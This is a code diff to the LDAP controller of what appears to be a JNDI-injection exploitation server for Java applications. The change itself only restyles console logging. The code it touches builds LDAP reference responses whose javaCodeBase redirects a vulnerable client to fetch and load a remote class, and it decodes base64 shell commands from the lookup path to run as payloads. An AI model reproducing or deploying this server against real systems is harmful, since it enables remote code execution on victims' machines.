@@ -14,6 +14,7 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import org.fusesource.jansi.Ansi;
 
 import java.net.URL;
 import java.util.Base64;
@@ -32,7 +33,6 @@ public class BasicController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + " @|green with basic remote reference payload|@"));
             Entry  e         = new Entry(base);
             String className = "";
 
@@ -61,7 +61,7 @@ public class BasicController implements LdapController {
             String className1 = className.replaceAll("\\.", "/");
 
             URL    turl       = new URL(new URL(this.codebase), className1 + ".class");
-            System.out.println(ansi().render("@|green [+] Send LDAP reference result for |@" + base + " @|green redirecting to |@" + turl));
+            System.out.println(Ansi.ansi().fgBrightBlue().a("  redirecting to " + turl).reset());
             e.addAttribute("javaClassName", "foo");
             e.addAttribute("javaCodeBase", this.codebase);
             e.addAttribute("objectClass", "javaNamingReference");
@@ -77,6 +77,7 @@ public class BasicController implements LdapController {
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
+        System.out.println("- JNDI Remote Refenrence Links ");
         try {
             base = base.replace('\\', '/');
             int fistIndex   = base.indexOf("/");
@@ -85,7 +86,7 @@ public class BasicController implements LdapController {
 
             try {
                 payloadType = base.substring(fistIndex + 1, secondIndex);
-                System.out.println(ansi().render("@|green [+] PaylaodType : |@" + payloadType));
+                System.out.println(Ansi.ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -102,7 +103,7 @@ public class BasicController implements LdapController {
 
             if (gadgetType == GadgetType.base64) {
                 String cmd = Util.getCmdFromBase(base);
-                System.out.println(ansi().render("@|green [+] Command   |@" + cmd));
+                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                 params = new String[]{cmd};
             }
 
@@ -111,7 +112,7 @@ public class BasicController implements LdapController {
                 byte[]   decodedBytes = Base64.getDecoder().decode(cmd1);
                 String   cmd          = new String(decodedBytes);
                 String[] cmdArray     = cmd.split(" ");
-                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
+                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                 params = cmdArray;
             }
 
